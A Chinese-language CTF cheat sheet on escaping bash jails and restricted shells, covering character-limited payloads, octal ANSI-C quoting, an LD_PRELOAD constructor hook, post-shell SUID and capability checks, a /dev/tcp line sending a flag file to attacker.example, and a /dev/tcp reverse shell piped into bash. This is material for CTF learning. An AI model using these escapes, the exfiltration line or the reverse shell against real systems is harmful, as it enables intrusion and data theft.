# CTF Misc - Bash Jails & Restricted Shells

## 目录
- [识别 Jail](#identifying-the-jail)
- [Eval 上下文检测](#eval-context-detection)
- [字符受限的 Bash：仅允许 #、$、\](#character-restricted-bash-only---)
- [内部服务发现（Shell 后）](#internal-service-discovery-post-shell)
- [其他受限字符集技巧](#other-restricted-character-set-tricks)
  - [从 $# 和 ${##} 构建数字](#building-numbers-from--and-)
  - [使用 PID 数字](#using-pid-digits)
  - [ANSI-C 引用中的八进制](#octal-in-ansi-c-quoting)
  - [Dollar-zero 变体](#dollar-zero-variants)
- [权限提升检查清单（Shell 后）](#privilege-escalation-checklist-post-shell)
- [HISTFILE 技巧用于受限 Shell 文件读取（BCTF 2016）](#histfile-trick-for-restricted-shell-file-reads-bctf-2016)
- [通过 $'...' 八进制编码绕过 Bash Jail（34C3 CTF 2017）](#bash-jail-bypass-via--octal-encoding-34c3-ctf-2017)
- [通过 rbash 允许的变量设置实现 LD_PRELOAD Hook（OTW Advent 2018）](#ld_preload-hook-via-rbash-allowed-variable-set-otw-advent-2018)
- [/dev/tcp 从最小命令集进行数据外泄（OTW Advent 2018）](#devtcp-exfiltration-from-minimal-command-set-otw-advent-2018)
- [逐层 Echo-Only Bash 逃逸（Insomnihack 2019）](#layer-by-layer-echo-only-bash-escape-insomnihack-2019)
- [带 \r 截断的关闭标准输出 Jail（Insomnihack 2019）](#closed-stdout-jail-with-r-truncation-insomnihack-2019)
- [参考文献](#references)

---

## 识别 Jail

**方法论：** 发送测试输入并观察错误信息以确定：
1. 允许哪些字符（白名单 vs 黑名单）
2. 输入是否被 `eval` 执行，传递给 `bash -c`，或其他方式
3. 输入是否被包裹在引号中（双引号 eval 上下文）

**字符过滤测试：**
```python
from pwn import *
import time

# 发送每个字符，结合已知有效的 payload
for c in range(32, 127):
    r = remote(host, port, level='error')
    r.sendline(b'$#' + bytes([c]) + b'$#')
    time.sleep(0.3)
    try:
        data = r.recv(timeout=1)
        if data:
            print(f'{chr(c)!r}: {data.decode().strip()[:60]}')
    except:
        pass
    r.close()
```

**静默拒绝 = 字符不被允许。** 有错误输出 = 字符通过了过滤。

**关键洞察：** 系统地探测每个可打印字符，绘制允许字符集的映射，然后再构造 payload。静默拒绝表示字符被过滤；任何错误输出表示字符通过过滤并到达 shell。

---

## Eval 上下文检测

**双引号 eval** (`eval "$input"`):
- 末尾 `\` 会导致：`unexpected EOF while looking for matching '"'`
- `$#` 展开为 `0`（双引号内 `$` 仍会展开）
- `\$` 产生字面 `$`（反斜杠在双引号中转义美元符号）
- `\#` 产生字面 `#`（反斜杠在双引号中不转义 `#`，但 eval 会将 `\#` 解释为字面 `#`）

**裸 eval** (`eval $input`):
- 会进行单词拆分
- 反斜杠转义行为不同

**读取行为：**
- `read -r`：反斜杠字面保留
- `read`（无 -r）：反斜杠作为转义字符（会剥离反斜杠）

**关键洞察：** 通过发送末尾反斜杠区分 `eval "$input"`（双引号）和 `eval $input`（裸）。双引号 eval 会产生“unexpected EOF”错误，因为反斜杠转义了闭合引号；裸 eval 不会。此方法确定可利用的转义序列。

---

## 字符受限的 Bash：仅允许 `#`、`$`、`\`

**模式（HashCashSlash）：** 过滤正则 `^[\\#\$]+$` 仅允许井号、美元符号、反斜杠。

**可用扩展：**
| 构造 | 结果 | 说明 |
|-------|-------|-------|
| `$#` | `0` | 位置参数数量 |
| `$$` | PID | 当前进程 ID（多位数字） |
| `\$` | 字面 `$` | 在双引号 eval 上下文中 |
| `\\` | 字面 `\` | 在双引号 eval 上下文中 |
| `\#` | 字面 `#` | 通过 eval 的二次解析 |

**关键 payload：`\$$#`**

在类似 `bash -c "\"${x}\""` 的双引号 eval 上下文中：
- `\$` → 字面 `$`（反斜杠在双引号中转义美元符号）
- `$#` → `0`（参数扩展）
- 组合后：`$0` 在 eval 上下文中
- `$0` = shell 名称 = `bash`
- 结果：**启动一个交互式 bash shell**

**为何有效：** 脚本将输入用双引号包裹传给 `bash -c`，所以 `\$` 变成字面 `$`，然后 `$#` 扩展为 `0`，得到字符串 `$0`。eval 执行时，`$0` 展开为 shell 调用名（`bash`），从而启动新 shell。

---
## Internal Service Discovery (Post-Shell)

逃出 jail 后，flag 可能无法直接读取。检查内部服务：

```bash
# 查找所有运行中的进程及其命令行
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' '

# 专门查找提供 flag 的进程
for pid in /proc/[0-9]*/; do
    cmd=$(cat ${pid}cmdline 2>/dev/null | tr '\0' ' ')
    if echo "$cmd" | grep -qi flag; then
        echo "PID $(basename $pid): $cmd"
        cat ${pid}status 2>/dev/null | grep -E "^(Uid|Name):"
    fi
done
```

**常见模式：**
- `socat TCP-LISTEN:PORT,bind=127.0.0.1 EXEC:cat /flag` → flag 在本地回环端口
- 带有 SUID 位的 `readflag` 二进制文件
- root 进程环境变量中的 flag

**连接内部服务：**
```bash
# Bash 内置 TCP（无需 netcat）
cat < /dev/tcp/127.0.0.1/PORT

# 如果有 netcat 可用
nc 127.0.0.1 PORT
```

**关键洞察：** 逃出 jail 后，检查 `/proc/*/cmdline` 以寻找在本地回环地址提供 flag 的内部服务。flag 通常在不同进程中，无法直接从文件系统读取。

---

## 其他受限字符集技巧

### 利用 `$#` 和 `${##}` 构建数字
如果允许使用 `{` 和 `}`：
- `$#` = 0
- `${##}` = 1（`$#` 字符串值 "0" 的长度）
- 连接构建二进制：`${##}$#${##}` = "101"

### 使用 PID 数字
`$$` 返回多位数字。如果能提取单个数字（需要 `{}` 和 `:`）：
```bash
${$$:0:1}  # PID 的第一位数字
${$$:1:1}  # PID 的第二位数字
```

### ANSI-C 引用中的八进制
如果允许 `'`：`$'\101'` = `A`，`$'\142\141\163\150'` = `bash`

### Dollar-zero 变体
| Shell | `$0` 的值 |
|-------|-----------|
| bash 脚本 | 脚本路径 |
| bash -c | `bash` |
| 交互式 | `bash` 或 `-bash` |
| sh | `sh` |

**关键洞察：** 通过组合 `$#`（返回 0）、`${##}`（返回 1）、`$$`（PID 数字）和 ANSI-C 引用（`$'\NNN'` 八进制）可以从极简字符集构建任意字符串。即使只有 3 个字符的字母表（`#$\`）也足以通过 `$0` 扩展生成 shell。

---

## 权限提升检查清单 (Post-Shell)

1. **SUID 二进制文件：** `find / -perm -4000 2>/dev/null`
2. **Capabilities：** `find / -executable -type f -exec getcap {} \; 2>/dev/null`
3. **内部服务：** 检查 `/proc/*/cmdline` 中提供 flag 的守护进程
4. **进程 UID：** `cat /proc/*/status 2>/dev/null | grep -A5 "^Name:.*flag"`
5. **可写路径：** 检查 PATH 中是否包含可写目录
6. **Docker/容器：** 使用 `/dev/tcp` 访问内部服务，检查 `/.dockerenv` 是否存在

**关键洞察：** 逃出 jail 后，按顺序执行此清单：先查找 SUID 二进制和 capabilities（最快捷），然后通过 `/proc/*/cmdline` 查找内部服务，最后检查可写的 PATH 目录。在容器中，使用 `/dev/tcp` 访问内部服务，因为 netcat 通常不可用。

---

## HISTFILE 技巧用于受限 Shell 文件读取 (BCTF 2016)

在受限 bash shell 中无需 cat/less/head 读取任意文件：

```bash
# 方法 1：HISTFILE 加载
HISTFILE=/path/to/flag /bin/bash
history  # flag 内容作为命令历史加载

# 方法 2：bash 详细模式
bash -v flag.txt  # 执行前打印每行；注释行（#flag{...}）无错误打印

# 方法 3：ctypes.sh 直接调用 C 库
dlcall -n fd open /flag 0
dlcall -n m mmap 0 100 1 1 $fd 0
dlcall printf %s $m
```

**关键洞察：** 三种无需标准工具读取文件的方法：（1）HISTFILE 加载，（2）`bash -v` 详细模式，（3）通过 `dlcall` 使用 `ctypes.sh` 直接调用 C 库。

---
## 通过 $'...' 八进制编码绕过 Bash Jail（34C3 CTF 2017）

当禁止使用 a-z、`*`、`?`、`.` 时，使用带八进制转义的 `$'...'` ANSI-C 引号：

```bash
# 将 /get_flag 编码为八进制
__=$'\057\147\145\164\137\146\154\141\147'
$__  # 执行 /get_flag

# 或者逐字符编码任意命令：
# /bin/sh = $'\057\142\151\156\057\163\150'
```

另外：从已有环境变量中提取字符：

```bash
# ${VARIABLE:START:LENGTH} 提取子字符串
# 从 $PATH、$HOME、$OSTYPE、$HOSTNAME 构建命令:
/${OSTYPE:6:1}${HOSTNAME:2:1}${HOME:1:1}_${HOSTNAME:9:1}${PATH:5:1}...
```

**关键洞察：** Bash 的 `$'...'` 语法将 `\NNN` 解释为八进制字节值，允许在不使用任何字母字符的情况下构造任意字符串。结合环境变量子串提取（`${VAR:offset:length}`），几乎可以绕过任何字符黑名单。变量名 `__` 仅使用下划线（通常不被禁止）。当字母被禁止但允许 `$`、`'`、`\` 和数字时，ANSI-C 引号中的八进制编码是主要的逃逸手段。

---

## 通过 rbash 允许的变量设置实现 LD_PRELOAD Hook（OTW Advent 2018）

**模式：** rbash 阻止路径参数，但仍允许在调用允许的二进制文件时使用 `VAR=value command` 前缀。上传一个编码了 libc hook 的共享对象，然后在允许列表中的任何命令（如 `cat`、`ls`、`id`）前导出 `LD_PRELOAD=./hook.so`。该 hook 会在允许的二进制文件调用每个 libc 符号时运行。

```c
// hook.c — 劫持 open()
#include <stdlib.h>
__attribute__((constructor))
void init(void) { system("/bin/bash -p -c 'cat /flag'"); }
```

```bash
gcc -shared -fPIC hook.c -o /tmp/hook.so
LD_PRELOAD=/tmp/hook.so cat   # constructor 在 cat 之前运行
```

**关键洞察：** 受限 shell 强制 argv 过滤，而非环境过滤。任何允许的动态链接 libc 的二进制文件都可以通过 `LD_PRELOAD` 被劫持，只要你能写入一个 `.so` 到可写路径。防护措施是在 shell 入口处取消设置 `LD_PRELOAD`、`LD_LIBRARY_PATH` 和 `LD_AUDIT`。

**参考：** OverTheWire Advent 2018 — Claustrophobic，writeup 12770

---

## 通过 /dev/tcp 从最小命令集进行数据外泄（OTW Advent 2018）

**模式：** 只有 `cat`、`echo` 和 `dd` 可用——没有 `curl`、`wget`、`nc`、`python`。Bash 将 `/dev/tcp/<host>/<port>` 作为虚拟套接字文件暴露；重定向到它会打开一个原始 TCP 连接，无需额外二进制。

```bash
cat /opt/flag > /dev/tcp/attacker.example/8081
# 攻击者端：
nc -lvnp 8081
```

双向 shell：

```bash
exec 3<> /dev/tcp/attacker.example/8081
cat <&3 | bash >&3 2>&3
```

**关键洞察：** `/dev/tcp` 和 `/dev/udp` 是 *内置于 bash* 的，而非真实文件系统路径——任何发行版只要带有 GNU bash 即支持它们，即使缺少 `netcat`/`curl`。在假设需要外部工具前，务必先测试文件重定向。

**参考：** OverTheWire Advent 2018 — Santa's little recorders，writeup 12780

---

## 逐层构建仅 echo 的 Bash 逃逸（Insomnihack 2019）

**模式：** Jail 只允许 `echo`、`(`、`)`、`+`、`=`、`;`、`\`、`$` 和空白字符。通过递归构造更强的原语逐轮逃逸：

```bash
# 第0轮：允许字符 → 通过 $((a = 1)) 获得无限制的 `=`
# 第1轮：算术设置更多变量；通过递增循环使用 $'\NNN'
a=$((++a))                       # 无数字计数器
# 第N轮：以八进制转义形式输出任意 payload
$('\143\141\164'  /flag)         # cat /flag
```

使用 `++` 递增未初始化变量构建数字，然后从 `$PATH`、`$PWD` 或任何泄露变量中索引字符。最后用 `\` 拼接这些字符形成任意命令。

**关键洞察：** 仅 echo 的 jail 可逃逸，因为 bash 的算术上下文将未初始化变量视为 `0` 并支持 `++`，从而无需数字即可获得任意整数。接着，`$'\NNN'` 构建任意字节，进而构建任意命令。

**参考：** Insomnihack teaser 2019 — echoechoechoecho，writeup 12911

---
## 关闭 stdout 且带有 \r 截断的 Jail（Insomnihack 2019）

**模式：** 一个 bash 执行服务运行命令，但 stdout（和 stderr）被关闭，因此正常输出会静默消失。此外，目标文件开头包含一个 `\r`，导致天真的 `cat` 命令将其渲染为“覆盖该行”，从而隐藏了 flag。解决方法有两方面：将输出重定向到仍然打开的文件描述符（stdin 连接到网络套接字，或 `/dev/tty`），并使用 `cat -A` / `od -c` / `xxd`，使回车符显示为 `^M`，而不是截断显示。

```bash
# 1. 确认 stdout 被关闭 — 输出永远不会返回
echo hello                      # 无输出
echo hello 2>&1                 # 仍无输出（stderr 也被关闭）

# 2. 重定向到 stdin（fd 0），它是 nc 风格服务的网络套接字
cat flag 1>&0
# 只返回 \r 之后的尾部，因为终端将 \r 解释为回车

# 3. 使用 cat -A（显示所有字符），使 CR 显示为 ^M，隐藏的前缀得以显现
cat -A flag 1>&0
# 或者：od -c flag 1>&0   /   xxd flag 1>&0   /   base64 flag 1>&0

# 备选方案：重新打开一个可写的 stdout
exec 1>/dev/tty        # 仅当连接了 tty 时有效
exec 1>&0              # 将套接字 fd 复制到 stdout，供后续命令使用
```

**关键洞察：** “命令执行但无输出”意味着 stdout 被关闭 — 找到任何仍然打开的 fd（stdin 连接到网络套接字总是打开的）并用 `1>&0` 重定向。一旦输出流通，需警惕显示伪影：原始 `cat` 中 `\r` 会截断，ANSI CSI 序列可能清空行，`\x1b[2J` 会清屏。始终用 `cat -A`、`od -c`、`xxd` 或 `base64` 检查可疑文件，确保没有字节在转换中丢失。

**参考资料：** Insomnihack 2019 — myBrokenBash，writeups 13989 和 13990

---

## 参考资料

- 0xL4ugh CTF “HashCashSlash”：过滤器 `^[\\#\$]+$`，payload 为 `\$$#`，内部 socat flag 服务
